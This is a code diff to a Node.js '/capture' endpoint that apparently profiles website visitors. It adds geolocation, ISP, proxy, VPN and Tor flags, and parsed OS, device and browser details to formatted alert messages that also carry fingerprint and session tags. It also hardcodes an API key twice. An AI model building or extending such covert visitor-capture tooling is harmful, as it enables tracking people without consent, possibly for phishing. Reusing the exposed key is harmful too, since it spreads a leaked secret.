@@ -147,19 +147,64 @@ app.post('/capture', async (req, res) => {
     const ipString = ip.split(',')[0].trim();
     let geo_line = '';
     
-    // Quick API Ninja IP Lookup
+    // IPGeolocation API Lookup
     if (ipString && ipString !== 'Unknown' && ipString !== '::1' && ipString !== '127.0.0.1') {
-        const ipap = await apiNinja('iplookup', { address: ipString });
-        if (ipap && ipap.country) {
-            const flag = ipap.country.substring(0, 2).toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397));
-            geo_line = `🌍 <b>Geo:</b> <code>${he(ipap.city)}, ${he(ipap.region)}, ${he(ipap.country)}</code> ${flag}`;
+        try {
+            const ipgeoKey = '55d11665677f43d39b9aeeb278de6bd8';
+            let ipData = null;
+            try {
+                // Try fetching with security info (may fail on Free Tier)
+                const res = await axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${ipgeoKey}&ip=${ipString}&include=security`, { timeout: 3000 });
+                ipData = res.data;
+            } catch (e) {
+                // Fallback to basic location if premium fails
+                const res = await axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${ipgeoKey}&ip=${ipString}`, { timeout: 3000 });
+                ipData = res.data;
+            }
+
+            if (ipData && ipData.country_name) {
+                const flag = ipData.country_code2 ? ipData.country_code2.toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397)) : '';
+                geo_line = `🌍 <b>Geo:</b> <code>${he(ipData.city)}, ${he(ipData.state_prov || ipData.district)}, ${he(ipData.country_name)}</code> ${flag}`;
+                
+                if (ipData.isp) geo_line += `\n🏢 <b>ISP:</b> <code>${he(ipData.isp)}</code>`;
+                
+                if (ipData.security) {
+                    const sec = ipData.security;
+                    const threats = [];
+                    if (sec.is_proxy) threats.push('Proxy');
+                    if (sec.is_vpn) threats.push('VPN');
+                    if (sec.is_tor) threats.push('Tor');
+                    if (sec.is_bogon) threats.push('Bogon');
+                    if (sec.is_spam) threats.push('Spam');
+                    if (threats.length > 0) {
+                        geo_line += `\n⚠️ <b>Security:</b> <code>${threats.join(', ')}</code>`;
+                    }
+                }
+            }
+        } catch (e) {
+            // Silently fallback if both endpoints fail
         }
+    }
+
+    let parsedUA = `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>`;
+    try {
+        const ipgeoKey = '55d11665677f43d39b9aeeb278de6bd8';
+        const uaRes = await axios.get(`https://api.ipgeolocation.io/user-agent?apiKey=${ipgeoKey}&ua=${encodeURIComponent(user_agent)}`, { timeout: 2000 });
+        if (uaRes.data && uaRes.data.name) {
+            const u = uaRes.data;
+            const os = u.operatingSystem ? `${u.operatingSystem.name} ${u.operatingSystem.version}` : 'Unknown OS';
+            const dev = u.device ? u.device.type : 'Unknown Device';
+            parsedUA = `💻 <b>System:</b> <code>${he(os)} - ${he(dev)}</code>\n` + 
+                       `🧭 <b>Browser:</b> <code>${he(u.name)} ${he(u.versionMajor || '')}</code>`;
+        }
+    } catch (e) {
+        // Keeps raw UA if premium tier check fails
     }
 
     const header = `🕒 <code>${timestamp}</code>\n`
         + `📍 <b>IP:</b> <code>${he(ipString)}</code>\n`
         + (geo_line ? geo_line + '\n' : '')
-        + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
+        + `${parsedUA}\n`
         + fp_line
         + sid_tag + "\n";
 
@@ -173,7 +218,7 @@ app.post('/capture', async (req, res) => {
                 + (geo_line ? geo_line + '\n' : '')
                 + `🌐 <b>Page:</b> <code>${he(d.url || 'Unknown')}</code>\n`
                 + `🖥️ <b>Res:</b> <code>${he(d.res || 'Unknown')}</code>\n`
-                + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
+                + `${parsedUA}\n`
                 + fp_line
                 + sid_tag;
             break;
